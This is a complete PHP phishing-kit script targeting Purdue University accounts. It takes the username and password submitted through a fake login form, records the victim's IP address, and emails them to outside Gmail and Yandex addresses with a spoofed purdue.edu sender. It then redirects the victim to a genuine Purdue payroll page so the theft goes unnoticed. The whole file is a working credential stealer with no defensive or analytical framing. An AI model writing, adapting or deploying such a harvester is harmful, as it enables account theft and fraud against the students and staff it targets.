<?

$ip = getenv("REMOTE_ADDR");
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$send = "yft.t@yandex.com,leadsresults1@gmail.com";
$subject = "~ cs.purdue.edu ~";
$headers = "From: StarBoy<logs@purdue.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://www.purdue.edu/studentemployment/site/EmployeeResources/Payroll.php");
	  

?>